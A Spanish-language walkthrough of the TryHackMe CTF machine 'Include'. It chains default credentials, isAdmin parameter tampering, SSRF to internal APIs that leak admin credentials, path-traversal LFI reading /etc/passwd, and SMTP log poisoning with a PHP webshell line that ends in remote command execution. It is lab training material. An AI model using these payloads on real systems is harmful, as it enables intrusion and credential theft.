# 🕵️ Walkthrough: Include – TryHackMe  

## 📌 Introducción  
En este CTF trabajaremos con la máquina **Include** de TryHackMe.  
El objetivo será enumerar los servicios disponibles, explotar vulnerabilidades web y escalar privilegios para obtener la bandera final.  

---

## 🔎 Paso 1: Comprobando conectividad  

Lo primero es verificar que la máquina víctima responde correctamente.  
Realizamos un **ping** a la IP de destino `10.10.182.236`:  

```bash
ping -c 4 10.10.182.236
```

📸 Captura: 

<img width="810" height="386" alt="Ping" src="https://github.com/user-attachments/assets/c4b4b9a4-bc27-471a-b4b7-01e7d7c2ead9" />

El host responde con un tiempo promedio de ~46 ms y sin pérdida de paquetes, lo que confirma que la máquina está activa y accesible en la red.

---

## 🔎 Paso 2: Escaneo con Nmap  

Después de confirmar la conectividad, realizamos un escaneo de puertos con **Nmap** para identificar los servicios expuestos en la máquina.  

```bash
nmap -sC -sV -p- 10.10.182.236
```

📸 Captura: 

<img width="1354" height="827" alt="nmap puertos abiertos" src="https://github.com/user-attachments/assets/fb422e0b-7b17-48a7-8974-ad138eca0425" />

✅ Puertos abiertos encontrados:
22/tcp – OpenSSH 8.2p1 (Ubuntu)

25/tcp – SMTP (Postfix)

110/tcp – POP3 (Dovecot)

143/tcp – IMAP (Dovecot)

993/tcp – IMAPS (Dovecot)

995/tcp – POP3S (Dovecot)

4000/tcp – HTTP (Node.js – Express middleware)

50000/tcp – HTTP (Apache httpd 2.4.41, Ubuntu)

🔍 Observaciones:

El servidor tiene varios servicios de correo (SMTP, POP3, IMAP) habilitados.

Los puertos 4000 y 50000 destacan por ser servicios web:

4000 corre sobre Node.js con Express.

50000 ejecuta Apache/2.4.41 (Ubuntu).

Estos servicios web suelen ser los vectores principales de ataque en este tipo de retos.

---

## 🔎 Paso 3: Enumeración de directorios con Gobuster  

Tras identificar el servicio web corriendo en el puerto **4000 (Node.js/Express)**, procedemos a realizar una enumeración de directorios con **Gobuster**:  

```bash
gobuster dir -u http://10.10.182.236:4000/ -x php,html,css,js,txt,pdf -w /home/quiqu3h4ck/Escritorio/wordlists/dirbuster/directory-list-2.3-medium.txt
```

📸 Captura: 

<img width="1166" height="514" alt="gobuster nada interesante" src="https://github.com/user-attachments/assets/e74e380d-1924-4c9d-a03e-2704ea1413d7" />

✅ Resultados relevantes:
/index → Página principal

/signin → Redirige (302) a /signin

/images/ → Directorio de imágenes

/fonts/ → Directorio de fuentes

Archivos .css como index.css, style.css, etc.

🔍 Observaciones:
Los directorios encontrados no muestran nada especialmente sensible en esta fase inicial.

El endpoint /signin es interesante, ya que apunta a un posible sistema de autenticación.

Los directorios estáticos (/images/, /fonts/) pueden servir más adelante para reconocimiento de tecnología o búsqueda de comentarios ocultos en archivos.

---

## 🔎 Paso 4: Acceso al portal de login (/signin)  

Durante la enumeración encontramos un endpoint interesante: **`/signin`**.
Al acceder desde el navegador se muestra un formulario de autenticación.  

📸 *Captura: 

<img width="1045" height="736" alt="sitio web puerto 4000 credenciales por defecto" src="https://github.com/user-attachments/assets/6746fc95-952e-4f64-9e8d-ee4c971c22ad" />

### ✅ Observaciones:
- La propia interfaz sugiere credenciales por defecto:  
usuario: guest
contraseña: guest

- Esto indica un posible descuido de configuración o cuenta de acceso inicial.  

---

## 🔎 Paso 5: Acceso con credenciales guest/guest  

Probamos las credenciales por defecto sugeridas en el portal `/signin`:  

usuario: guest
contraseña: guest

📸 *Captura: 

<img width="1331" height="817" alt="interfaz Review App" src="https://github.com/user-attachments/assets/e259bf2f-6e54-4a47-baec-260a0f6fbc50" />

### ✅ Resultado:
El login fue exitoso y accedemos a una aplicación llamada **Review App**.  

- Se muestra el perfil del usuario `guest`.  
- También aparecen otros usuarios registrados como **David** y **Marry**.  
- Existe un botón **“View Profile”** que podría revelar más información sensible al ser presionado.  

### 🔍 Observaciones:
- El acceso con credenciales por defecto confirma una **falla de seguridad crítica** (uso de credenciales estáticas).  
- La interfaz sugiere que cada perfil podría ser accesible mediante endpoints individuales, lo que abre la posibilidad de probar **enumeración de usuarios** o incluso **inclusión de archivos** (LFI/RFI) en los parámetros al cargar perfiles.  

---

## 🔎 Paso 6: Exploración del perfil de usuario  

Al hacer clic en **“View Profile”** dentro del usuario `guest`, se accede a una vista más detallada del perfil.  

📸 *Captura:

<img width="1316" height="888" alt="dentro del perfil posible punto de inresar parametros" src="https://github.com/user-attachments/assets/4d7d6db6-f0a0-40a2-a605-207db8f80dc1" />

### ✅ Información mostrada:
- **id:** 1  
- **name:** guest  
- **age:** 25  
- **country:** "UK"  
- **albums:** [{"name":"USA Trip","photos":"www.thm.me"}]  
- **isAdmin:** false  
- **profileImage:** `/images/prof1.avif`  

### 🔍 Observaciones:
- El campo **isAdmin: false** sugiere que puede existir un rol administrativo (`true`) al cual intentaremos acceder posteriormente.
- La referencia a `profileImage` apunta a un archivo cargado en el servidor (`/images/prof1.avif`), lo que podría ser vulnerable a **Inclusion de Archivos Locales (LFI)** si el sistema permite manipular parámetros al cargar imágenes o información de perfil.  
- El formulario **“Recommend an Activity”** permite introducir texto que podría ser usado como punto de inyección para pruebas adicionales (XSS, SQLi, etc.).

---

## 🔎 Paso 7: Manipulación de parámetros en el formulario  

Al interactuar con la opción **“Recommend an Activity”**, descubrimos que el formulario acepta valores arbitrarios que se reflejan en los datos del perfil.  

📸 *Captura:

<img width="1920" height="1080" alt="modificar valor de edad" src="https://github.com/user-attachments/assets/46618516-714e-4545-b90d-02b0fc6607a0" />

### ✅ Observaciones:
- Se cambió el valor de `age` a **42**
- Esto confirma que el sistema es vulnerable a **manipulación de parámetros** en el cliente.  
- Si otros campos sensibles como `isAdmin` o `id` también pueden modificarse, podríamos intentar:
  - Cambiar `isAdmin` de **false → true**.  
  - Alterar el parámetro `id` en la URL (`/friend/1`) para enumerar otros usuarios.

 ---

## 🔎 Paso 8: Confirmación de manipulación exitosa  

Después de modificar el valor de `age` desde el formulario de **Recommend an Activity**, el cambio se reflejó en la vista de detalles del perfil.  

📸 *Captura: 

<img width="913" height="602" alt="edad modificada" src="https://github.com/user-attachments/assets/80b8c5c7-1a30-4be1-8e7b-a702052ee04b" />

### ✅ Observaciones:
- El sistema **no valida la integridad de los datos**, lo que permite al atacante modificar información sensible directamente.  
- Esto confirma que existe una vulnerabilidad de **parameter tampering**.  

---

## 🔎 Paso 9: Escalada de privilegios mediante isAdmin=true  

Después de comprobar que el formulario era vulnerable a manipulación de parámetros, probamos modificar el valor de `isAdmin` de **false** a **true**.  

📸 *Capturas:

<img width="916" height="318" alt="modifcar el valor de isAdmin" src="https://github.com/user-attachments/assets/068d9300-3402-4aa2-b902-f79b88f8f31f" />

<img width="1425" height="628" alt="isAdmin modificado a true" src="https://github.com/user-attachments/assets/49e2bb4c-7fa9-498f-9868-2331afcd7758" />

### ✅ Resultado:
- El campo `isAdmin` cambió a `"true"`.  
- Automáticamente aparecieron nuevas opciones en el menú de navegación:  
  - **API**  
  - **Settings**  

### 🔍 Observaciones:
- La aplicación no implementa controles adecuados de autorización, lo que permite a cualquier usuario modificar su rol a administrador.  
- Con estas nuevas secciones visibles, podremos explorar posibles endpoints administrativos o configuraciones sensibles que podrían darnos un acceso más profundo al sistema.  

  ---

## 🔎 Paso 10: Exploración del panel Admin Settings  

Dentro de la sección **Settings** (habilitada al modificar `isAdmin=true`), encontramos la opción para **actualizar la URL del banner**.  

📸 *Captura:

<img width="1056" height="491" alt="panel settings posible ataque lado servidor" src="https://github.com/user-attachments/assets/cf1a3aac-2b5d-4455-bf5b-6259dc17bd23" />

### ✅ Observaciones:
- El sistema permite introducir una URL personalizada para cargar la imagen de fondo.  
- Esto sugiere una posible vulnerabilidad de **Server-Side Request Forgery (SSRF)**, ya que el servidor podría procesar peticiones a recursos internos o remotos basándose en la URL que introduzcamos.  
- Si el servidor no valida correctamente, podríamos:  
  - Acceder a archivos locales (`file:///etc/passwd`).  
  - Forzar conexiones a servicios internos (`http://127.0.0.1:50000`).  
  - Subir una URL maliciosa que nos dé ejecución remota de comandos (RCE).  

---

## 🔎 Paso 11: Comprobación de SSRF con servidor Python  

Para validar la vulnerabilidad de **Server-Side Request Forgery (SSRF)**, configuramos un servidor HTTP con Python en nuestra máquina atacante:  

```bash
python3 -m http.server 8000
```

📸 Captura:

<img width="511" height="143" alt="configuro serivdor de python http" src="https://github.com/user-attachments/assets/cfff4df2-bc5b-4ac8-9f9d-a110d8fd03e4" />

Luego, en el panel Admin Settings, modificamos la URL del banner y apuntamos hacia nuestro servidor:

http://10.11.147.155:8000/

📸 Captura: redirección del campo Update Banner Image URL hacia nuestro servidor

<img width="833" height="377" alt="redirigo a mi servidor python" src="https://github.com/user-attachments/assets/09f0615f-4489-4e2f-b271-47c00cb3a22e" />

---

## 🔎 Paso 12: Confirmación de SSRF con payload en Base64  

Para validar aún más la vulnerabilidad, probamos enviar un payload en formato **data URI** codificado en Base64 a través del campo `Update Banner Image URL`.  

📸 *Captura:

<img width="918" height="635" alt="resultado de la escucha del servidor" src="https://github.com/user-attachments/assets/37f436ee-ec11-40c6-9679-e65b862a0e14" />

El payload utilizado:  

data:text/html;charset=utf-8;base64,PCFET0NUWVBFIEhUTUw+...

### ✅ Resultado:
- El servidor web interno procesó el contenido en formato **data URI**, mostrándolo como si fuera una imagen válida.  
- Nuestro servidor Python recibió la petición (`GET / HTTP/1.1 200 -`), confirmando que la máquina víctima ejecuta las solicitudes que le enviamos.  

### 🔍 Observaciones:
- Esto confirma de manera concluyente que la aplicación es vulnerable a **Server-Side Request Forgery (SSRF)**.  
- La capacidad de enviar **data URIs** implica que podemos intentar incluir código o forzar accesos a **servicios internos** del sistema, como el servidor en el puerto `50000` identificado en el escaneo inicial de Nmap.  

---

## 🔎 Paso 13: Acceso al API Dashboard interno  

Tras explotar la vulnerabilidad de **SSRF**, logramos acceder al servicio interno que se ejecuta en el puerto **50000**.  

📸 *Captura: API Dashboard con endpoints internos*  

<img width="919" height="525" alt="panel de apis" src="https://github.com/user-attachments/assets/930c099b-3bdc-436c-9b24-81ffd5f9542c" />

### ✅ Información obtenida:
El panel muestra varias APIs accesibles únicamente para administradores:  

1. **Internal API**  
GET http://127.0.0.1:5000/internal-api
Response:
{
"secretKey": "superSecretKey123",
"confidentialInfo": "This is very confidential."
}


2. **Get Admins API**  
GET http://127.0.0.1:5000/getAllAdmins101099991
Response:
{
"ReviewAppUsername": "admin",
"ReviewAppPassword": "xxxxxx",
"SysMonAppUsername": "administrator",
"SysMonAppPassword": "xxxxxxxx"
}

### 🔍 Observaciones:
- El **Internal API** revela un `secretKey` que podría ser usado para autenticación o descifrado.  
- El **Get Admins API** expone directamente credenciales administrativas para dos aplicaciones:
- **ReviewApp** → usuario `admin`  
- **SysMonApp** → usuario `administrator`  
- Esto confirma una fuga crítica de información sensible.  

## 🔎 Paso 14: Acceso al Internal API mediante SSRF  

Una vez confirmado que podíamos usar el campo `Update Banner Image URL` para realizar **peticiones SSRF**, apuntamos hacia el endpoint interno identificado en el **API Dashboard**:  

http://127.0.0.1:5000/internal-api

📸 *Capturas: configuración del campo en Admin Settings y resultado en el panel* 

<img width="821" height="378" alt="utilizo api interna en el panel de setting" src="https://github.com/user-attachments/assets/7d63285b-b9ff-4fd7-a9d0-3400bfa1c4c5" />

<img width="884" height="456" alt="resultado api interna" src="https://github.com/user-attachments/assets/232eca53-38d1-46ec-abaf-2354c760c37c" />

🔍 Observaciones:

El endpoint Internal API confirma que podemos extraer datos confidenciales directamente desde servicios internos no expuestos al exterior.

## 🔎 Paso 15: Decodificación de la respuesta del Internal API  

Después de consultar el endpoint interno `http://127.0.0.1:5000/internal-api` mediante SSRF, obtuvimos una respuesta codificada.  

Procedimos a decodificarla en **Base64** para visualizar el contenido real:  

📸 *Captura: decodificación de la respuesta en Base64*  

<img width="879" height="439" alt="decodificando la de api interna" src="https://github.com/user-attachments/assets/b286c34a-e364-4f75-b55b-ec2816fa79ca" />

### ✅ Resultado:
El contenido revela información sensible:  

```json
{
  "secretKey": "superSecretKey123",
  "confidentialInfo": "This is very confidential information. Handle with care."
}
```

🔍 Observaciones:

El secretKey extraído podría ser utilizado en otros servicios o como parte de un proceso de autenticación en la aplicación.
Esto confirma que la vulnerabilidad de SSRF nos permite no solo acceder a servicios internos, sino también extraer datos confidenciales.

---

## 🔎 Paso 16: Explotación del endpoint GetAllAdmins  

Aprovechando la vulnerabilidad de **SSRF**, apuntamos el campo `Update Banner Image URL` al endpoint:  

http://127.0.0.1:5000/getAllAdmins101099991

📸 *Captura: configuración del campo con el endpoint interno*  

<img width="900" height="486" alt="utilizo api alladmins en el panel de setting" src="https://github.com/user-attachments/assets/68aca96a-30e6-4582-a4b5-03861f45723b" />

<img width="866" height="459" alt="resultado api alladmins" src="https://github.com/user-attachments/assets/e7becd95-04fe-4201-9b7d-65a84b89d8c9" />

El resultado fue una respuesta en **Base64** que al decodificar reveló credenciales administrativas.  

📸 *Captura: resultado de la respuesta en Base64*

<img width="898" height="516" alt="decodificando la de api alladmins" src="https://github.com/user-attachments/assets/ec28419a-90cd-4020-9662-2e0193f24871" />

### ✅ Información obtenida:
```json
{
  "ReviewAppUsername": "admin",
  "ReviewAppPassword": "xxxxxx",
  "SysMonAppUsername": "administrator",
  "SysMonAppPassword": "xxxxxxxx"
}
```
🔍 Observaciones:
El servidor devuelve credenciales en texto plano para dos aplicaciones:

ReviewApp: usuario admin

SysMonApp: usuario administrator

Es probable que estas credenciales también funcionen en otros servicios como SSH (puerto 22) o correo electrónico (puertos 25/110/143/993/995) expuestos en el escaneo inicial.

---

## 🔎 Paso 17: Intento de login con credenciales expuestas  

Después de obtener las credenciales del endpoint **getAllAdmins101099991**, intentamos usarlas en el formulario de login de la aplicación web en el puerto **4000**.  

📸 *Captura: intento de login con el usuario `admin`*  

<img width="769" height="320" alt="pruebo claves admin no funciona" src="https://github.com/user-attachments/assets/6974eadc-ed74-4ae8-bd17-b7e8ab0d1db9" />

### ❌ Resultado:
- El login devolvió el error **"Incorrect name or password"**.  
- Esto confirma que las credenciales filtradas **no son válidas para el acceso al portal web**.  

### 🔍 Observaciones:
- Las credenciales pueden estar destinadas a otros servicios identificados en el escaneo inicial de Nmap:
  - **SSH (22/tcp)** – posible acceso remoto al sistema.  
  - **Servicios de correo (SMTP, POP3, IMAP)** – podrían reutilizar las mismas contraseñas.  
  - **SysMonApp** – aplicación secundaria mencionada en la fuga de información.  

## 🔎 Paso 18: Acceso al portal SysMon (puerto 50000)  

Tras comprobar que las credenciales no funcionaban en el login web principal, probamos usarlas en el **portal SysMon**, accesible en el puerto **50000**.  

📸 *Captura: intento de login en `http://10.10.182.236:50000/login.php` con el usuario `administrator`*  

<img width="1392" height="419" alt="pruebo portal de monitoreo con claves (Puerto 50000)" src="https://github.com/user-attachments/assets/f0896b2a-817e-4316-8e5b-43ff5f89ad09" />

### ✅ Credenciales usadas:
- **Usuario:** administrator  
- **Contraseña:** (obtenida desde el endpoint `getAllAdmins101099991`)  

### 🔍 Observaciones:
- Este servicio corresponde al segundo servidor web detectado en el escaneo inicial de Nmap.  
- Al introducir las credenciales, es posible que tengamos acceso a un panel de monitoreo del sistema, lo cual suele abrir la puerta a ejecuciones de comandos (RCE) o fuga de más información sensible.  

---

## 🔎 Paso 19: Acceso al SysMon Dashboard y obtención de la primera flag  

Con las credenciales del endpoint **getAllAdmins101099991**, accedimos exitosamente al portal **SysMon** en el puerto **50000**.  

📸 *Captura: acceso al dashboard con el usuario `administrator`*  

<img width="1449" height="440" alt="primera flag dentro del panel de monitoreo" src="https://github.com/user-attachments/assets/e921e0fe-cf4d-4cbf-aecc-ace1650a00b7" />

### ✅ Información visible:
- **Bienvenida personalizada:** “Welcome, administrator!”  
- **Panel de monitoreo del sistema** mostrando:
  - Uso de CPU  
  - Uso de RAM  
  - Espacio en disco  

### 🚩 Primera Flag encontrada:
THM{********}

### 🔍 Observaciones:
- Con la flag en el dashboard confirmamos el progreso dentro del CTF.  
- El panel de SysMon aún puede contener vulnerabilidades adicionales (por ejemplo, ejecución remota de comandos o acceso a configuraciones sensibles).  

---

## 🔎 Paso 20: Análisis del código fuente del SysMon Dashboard  

Al inspeccionar el código fuente de `dashboard.php`, encontramos referencias interesantes.  

📸 *Captura: extracto del código fuente del dashboard*  

<img width="1359" height="617" alt="codigo fuente dashboard monitoreo" src="https://github.com/user-attachments/assets/8997e097-df3e-4fb3-a250-d8d5247e0eab" />

### ✅ Hallazgos clave:
- Se carga una imagen de perfil desde el archivo:
profile.php?img=profile.png

- Esto indica que el archivo `profile.php` recibe un parámetro **`img`** que probablemente sea vulnerable a **Local File Inclusion (LFI)**.  

### 🔍 Observaciones:
- Si el parámetro `img` no valida correctamente la entrada, es posible manipularlo para acceder a archivos sensibles en el servidor.  
- Un vector común sería:
profile.php?img=../../../../etc/passwd

- Con esta técnica se podría acceder a información del sistema, archivos de configuración o incluso código fuente del propio panel SysMon.


## 🔎 Paso 21: Preparación de ataque LFI en profile.php  

Tras identificar que `profile.php` recibe el parámetro **`img`**, lo interceptamos con **BurpSuite** para probar posibles cargas maliciosas.  

📸 *Captura: petición interceptada en BurpSuite Intruder*  

<img width="1084" height="347" alt="capturo en burpsuite para carga util con intruder" src="https://github.com/user-attachments/assets/ef9d0876-9e55-47e5-bc17-ad07c238c853" />

### ✅ Petición interceptada:
```http
GET /profile.php?img=profile.png HTTP/1.1
```
Host: 10.10.182.236:50000
Cookie: PHPSESSID=m3kn999a2kcbl53lndtgjii00j

🔍 Observaciones:
El parámetro img apunta directamente a un archivo dentro del servidor (profile.png).

Es altamente probable que este parámetro sea vulnerable a LFI (Local File Inclusion).

Con BurpSuite Intruder podemos automatizar la inyección de rutas como:

../../../../etc/passwd
../../../../var/www/html/config.php
../../../../proc/self/environ

El objetivo es intentar leer archivos sensibles que nos permitan avanzar en la escalada de privilegios.

## 🔎 Paso 22: Explotación de LFI en profile.php  

Utilizando **BurpSuite Intruder**, probamos distintas cargas útiles en el parámetro `img` de `profile.php`.  

📸 *Captura: ejecución del payload para `/etc/passwd`*  

<img width="1082" height="331" alt="ejecutando carga util" src="https://github.com/user-attachments/assets/4625f58e-8537-43c1-994b-868f6cafa60c" />

### ✅ Payload exitoso:
```http
GET /profile.php?img=../../../../../../../../etc/passwd HTTP/1.1
```
Host: 10.10.182.236:50000
Cookie: PHPSESSID=m3kn999a2kcbl53lndtgjii00j

✅ Resultado:
El servidor devolvió el contenido del archivo /etc/passwd.

Esto confirma que el parámetro img es vulnerable a Local File Inclusion (LFI).

🔍 Observaciones:
Con acceso a /etc/passwd, podemos ver los usuarios existentes en el sistema.

El siguiente paso lógico será intentar leer otros archivos sensibles, como:

Archivos de configuración de Apache o PHP.

Ficheros con contraseñas (por ejemplo, config.php, .htpasswd).

Archivos de logs que puedan contener información reutilizable para escalada de privilegios.

---

## 🔎 Paso 23: Lectura del archivo /etc/passwd mediante LFI  

Con el parámetro vulnerable `img` en `profile.php`, lanzamos el payload para acceder al archivo **/etc/passwd**.  

📸 *Captura: respuesta del archivo /etc/passwd*  

<img width="1351" height="742" alt="passwd" src="https://github.com/user-attachments/assets/2d09fdf3-a004-4de9-8f91-0e8da28218f6" />

### ✅ Payload usado:
```http
GET /profile.php?img=../../../../../../../../etc/passwd HTTP/1.1
```
Host: 10.10.182.236:50000
Cookie: PHPSESSID=m3kn999a2kcbl53lndtgjii00j

✅ Resultado:
El servidor devolvió con éxito el contenido de /etc/passwd, mostrando los usuarios disponibles en el sistema:

root

www-data

ubuntu

mysql

thm (usuario interesante, probable objetivo)

Usuarios: joshua y charles

🔍 Observaciones:
El usuario thm parece ser una cuenta legítima del sistema (no de servicio), por lo que podría contener la user flag o permitirnos acceso vía SSH.

La explotación de LFI confirma que tenemos la capacidad de leer cualquier archivo accesible por el servidor web.

---

## 🔎 Paso 24: Acceso a logs del sistema con LFI  

Mediante el parámetro vulnerable `img` en `profile.php`, accedimos al archivo de logs del servidor de correo:  

📸 *Captura: lectura de `/var/log/mail.log` mediante LFI*  

<img width="1387" height="429" alt="registros de mail en archivo log" src="https://github.com/user-attachments/assets/423a2dd5-93e3-4159-921e-4113edb0758c" />

### ✅ Payload usado:
```http
GET /profile.php?img=../../../../../../../../var/log/mail.log HTTP/1.1
```
Host: 10.10.182.236:50000

✅ Resultado:
El archivo mail.log reveló múltiples conexiones y fallos de autenticación relacionados con Postfix y Dovecot.

Aparecen sesiones TLS y pruebas de login fallidas, algunas con métodos no soportados (NTLM, SSL_accept fallidos).

🔍 Observaciones:
Los logs de correo son una fuente valiosa porque en ocasiones pueden contener:

Credenciales en texto claro.

Usuarios de correo válidos que se pueden atacar por fuerza bruta.

Errores de configuración que revelen rutas o servicios internos.

En este caso, se observa actividad con el servicio de correo pero sin credenciales explícitas (todavía).

---

## 🔎 Paso 25: Intento de Log Poisoning para lograr RCE  

Ya que confirmamos que el parámetro `img` en `profile.php` es vulnerable a **LFI**, probamos envenenar los **logs del servidor de correo** para ejecutar código malicioso.  

📸 *Captura: inyección de código PHP en el servicio SMTP mediante Netcat*  

<img width="501" height="319" alt="intento de enviar un mail webshell php" src="https://github.com/user-attachments/assets/a3a15dd9-050e-4ab2-97e4-e40d10396581" />

### ✅ Comando usado:
```bash
nc 10.10.182.236 25
````
✅ Payload enviado:
php
Copiar código
helo ok
mail from: <?php system($_GET["cmd"]); ?>
quit

🔍 Observaciones:
El servidor respondió que el payload no fue aceptado como dirección válida (501 5.1.7 Bad sender address syntax).

A pesar de eso, el intento confirma que el servidor Postfix procesa los datos y podría registrar parte del payload en mail.log.

Si logramos que el código PHP quede escrito en los logs, podremos incluirlos mediante LFI con algo como:

/profile.php?img=../../../../../../../../var/log/mail.log&cmd=id
Esto permitiría convertir la vulnerabilidad de LFI en Remote Code Execution (RCE).

## 🔎 Paso 26: Ejecución de comandos en el servidor (RCE)  

Tras inyectar el payload PHP en el log de correo (`/var/log/mail.log`), se accedió al archivo con el parámetro vulnerable `img` y se añadió el parámetro `cmd` para ejecutar comandos en el sistema.  

📸 *Captura: Ejecución de `id` desde el parámetro `cmd`*  

<img width="1399" height="853" alt="ejcutando comandos cmd=id" src="https://github.com/user-attachments/assets/777e8a76-6d49-4f86-95c2-1a9a63996591" />

### ✅ Payload utilizado:
http://10.10.182.236:50000/profile.php?img=../../../../../../../../var/log/mail.log&cmd=id

### 🔍 Observaciones:
- El servidor ejecutó el comando con éxito, confirmando la ejecución remota de código.  
- Esto transforma la vulnerabilidad inicial de **LFI** en una **RCE crítica**.  
- Ahora es posible ejecutar cualquier comando en el sistema con permisos del usuario bajo el cual corre el servicio web.  

---

## 🔎 Paso 27: Enumeración de ficheros web y hallazgo de archivo sospechoso  

Ejecutamos el comando `ls -la /var/www/html` para enumerar los ficheros disponibles en el directorio raíz de la aplicación web.  

📸 *Captura: listado de ficheros dentro de `/var/www/html`*  

<img width="1386" height="866" alt="encotrado fichero txt" src="https://github.com/user-attachments/assets/041f71f6-0495-4d12-bed5-75b6ac4ac7bf" />

### ✅ Resultado:
Se identificó un archivo con nombre sospechoso y en formato `.txt`:  
50eb0fb8a9f2835b4d095f21f923ea2.txt

### 🔍 Observaciones:
- Los nombres aleatorios de tipo hash suelen estar asociados a **flags** en entornos CTF.  
- Este archivo podría contener una clave, credenciales, o directamente una bandera.  

---

## 🔎 Paso 28: Lectura del archivo final y obtención de la última flag  

Tras identificar el archivo sospechoso `50eb0fb8a9f2835b4d095f21f923ea2.txt` en `/var/www/html/`, procedimos a leer su contenido usando el parámetro vulnerable con `cat`.  

📸 *Captura: ejecución del comando `cat` sobre el archivo*  

<img width="1389" height="856" alt="comando cat para leer la ultima flag" src="https://github.com/user-attachments/assets/5f2e113d-2e93-4d05-b24a-6c7e085b843b" />

### ✅ Payload utilizado:
http://10.10.182.236:50000/profile.php?img=../../../../../../../../var/log/mail.log&cmd=cat%20/var/www/html/50eb0fb8a9f2835b4d095f21f923ea2.txt

### 🔍 Resultado:
El archivo contenía la **flag final** del CTF:  

THM{<flag_final>}

*(flag oculta en la captura para mantener el reto intacto)*  

### 🚩 Conclusiones:
- Se logró escalar de **LFI → Log Poisoning → RCE**.  
- Se enumeraron directorios y archivos hasta dar con un fichero que contenía la **última flag del laboratorio**.  
- El CTF **Include (TryHackMe)** queda completado con éxito. 🎯

